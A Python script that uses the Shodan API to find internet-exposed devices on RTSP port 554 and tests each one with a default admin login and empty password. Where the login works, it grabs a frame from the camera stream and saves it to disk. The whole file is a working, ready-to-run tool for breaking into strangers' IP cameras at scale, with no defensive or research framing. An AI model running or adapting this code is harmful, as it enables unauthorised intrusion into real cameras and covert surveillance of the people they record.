import urllib.request
import shodan
import rtsp
import multiprocessing
import time
import math
import argparse
import sys
import json
import os.path


def OpenImage(ip):
    client = rtsp.Client(rtsp_server_uri="rtsp://" + ip + ":554/user=admin&password=&channel=1&stream=0.sdp")
    client.read().save("cams\/" + ip + ".jpg")

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-ht', '--httptimeout', type=int, default=1)
    parser.add_argument('-rt', '--rtsptimeout', type=int, default=5)
    parser.add_argument('-l', '--limit', type=int, default=100)
    parser.add_argument('-a', '--advancedsearch', default="")
    parser.add_argument('-f', '--file', type=argparse.FileType())
    parser.add_argument('-t', '--filetype', '--type', choices=["json"], default="json")
    namespace = parser.parse_args()

    shodan.timeout = 0

    if not os.path.isdir("cams"):
        os.mkdir("cams")

    if not namespace.file:
        if os.path.isfile("SHODAN_TOKEN.txt"):
            SHODAN_API_KEY = open("SHODAN_TOKEN.txt", "r")
            token = SHODAN_API_KEY.readline().replace('\n', '')
        else:
            SHODAN_API_KEY = open("SHODAN_TOKEN.txt", "w+")
            token = input("Your shodan token: ")
            SHODAN_API_KEY.write(token)
        api = shodan.Shodan(token)
        SHODAN_API_KEY.close()

        req = f"port:554 {namespace.advancedsearch}"

        try:
            n = math.ceil(int(api.search(req, limit=1)["total"]) / 500) + 1
        except shodan.exception.APIError:
            print("Incorrect shodan token.")
            sys.exit()

        for p in range(1, n):
            Ocr = True
            while Ocr:
                try:
                    search = api.search(req, limit=namespace.limit, page=p)
                    Ocr = False
                except Exception:
                    print("WAITING")
                    time.sleep(60)
            print("Totals: %s" % len(search["matches"]))
            goods = []
            for host in search["matches"]:
                print(host["ip_str"])
                try:
                    cap = urllib.request.urlopen("http://" + host["ip_str"] + ":554/user=admin&password=&channel=1&stream=0.sdp", timeout=namespace.httptimeout)
                    if cap.getcode() == 200:
                        print("rtsp://" + host["ip_str"] + ":554/user=admin&password=&channel=1&stream=0.sdp")
                        goods.append(host["ip_str"])
                except Exception:
                    pass
            print("Finded %s results" % len(goods))
            for ip in goods:
                pc = multiprocessing.Process(target=OpenImage, args=(ip,))
                pc.start()
                time.sleep(namespace.rtsptimeout)
                if pc.is_alive():
                    pc.terminate()
                    print("%s is not responding" % ip)
            print("Page №%s is doned" % p)
    else:
        if namespace.filetype == "json":
            file = namespace.file
            lines = file.readlines()
            file.close()

            print("Totals: %s" % len(lines))
            goods = []
            for i, line in enumerate(lines):
                host = json.loads(line)
                print(i, host["ip_str"])
                try:
                    cap = urllib.request.urlopen("http://" + host["ip_str"] + ":554/user=admin&password=&channel=1&stream=0.sdp", timeout=namespace.httptimeout)
                    if cap.getcode() == 200:
                        print("rtsp://" + host["ip_str"] + ":554/user=admin&password=&channel=1&stream=0.sdp")
                        goods.append(host["ip_str"])
                except Exception:
                    pass
            print("Finded %s results" % len(goods))

            for i, ip in enumerate(goods):
                ip = ip.replace('\n', '')
                print(i, ip)
                pc = multiprocessing.Process(target=OpenImage, args=(ip,))
                pc.start()
                time.sleep(namespace.rtsptimeout)
                if pc.is_alive():
                    pc.terminate()
                    print("%s is not responding" % ip)
